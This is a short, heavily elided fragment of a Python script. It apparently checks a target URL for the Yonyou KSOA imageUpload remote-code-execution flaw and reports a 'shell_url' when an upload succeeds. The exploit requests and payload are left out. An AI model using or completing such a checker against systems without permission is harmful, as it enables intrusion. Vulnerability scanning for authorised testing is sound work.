...
def main(target_url):
    ...
    if target_url[-1] != '/':
        target_url += '/'
    print(now_time() + ' [INFO]     正在检测用友 yongyou_KSOA_imageUpload-RCE-漏洞')
    ...
    try:
        ...
        if response.status_code == 200:
            if response1.status_code == 200:
                print(now_time() + " [SUCCESS]  用友 yongyou_KSOA_imageUpload-RCE-漏洞，测试URL为: {}".format(shell_url))
        else:
            print(now_time() + " [WARNING]  用友 yongyou_KSOA_imageUpload-RCE-漏洞不存在")
    except:
